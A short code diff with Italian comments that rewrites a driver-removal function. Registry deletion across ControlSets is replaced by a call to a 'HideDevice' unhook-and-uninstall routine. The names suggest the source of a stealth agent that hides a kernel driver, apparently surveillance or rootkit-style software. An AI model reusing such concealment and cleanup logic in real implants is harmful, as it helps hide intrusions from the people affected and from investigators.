@@ -314,32 +314,16 @@ DWORD HM_RemoveCoreThread(void *dummy)
 }
 
 // Rimuove il driver dal sistema 
-void HM_RemoveDriver(WCHAR *driver_name)
+void HM_RemoveDriver()
 {
 	int i;
 	WCHAR *subkey;
 	WCHAR src_drv[MAX_PATH];
+	HideDevice reg_device;
 
-	for(i=0;;i++) {
-		// Cicla i profili (tramite i sid)
-		if (!RegEnumSubKey(HKEY_LOCAL_MACHINE, L"SYSTEM\\", i, &subkey))
-			break;
+	// Rimuove le chiavi nel registry
+	reg_device.unhook_uninstall();
 
-		// Vede se è un ControlSet
-		if (_wcsnicmp(subkey, L"ControlSet", wcslen(L"ControlSet"))) {
-			SAFE_FREE(subkey);
-			continue;
-		}
-
-		// Cancella la chiave e il relativo legacy
-		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"SYSTEM\\%s\\Services\\%s", subkey, driver_name);
-		RegDeleteKeyW(HKEY_LOCAL_MACHINE, src_drv);
-		swprintf_s(src_drv, sizeof(src_drv)/sizeof(src_drv[0]), L"SYSTEM\\%s\\Enum\\Root\\LEGACY_%s", subkey, driver_name);
-		RegDeleteKeyW(HKEY_LOCAL_MACHINE, src_drv);
-
-		SAFE_FREE(subkey);
-	}
-	
 	// Cancella il file del driver
 	RemoveSystemDriver();
 }
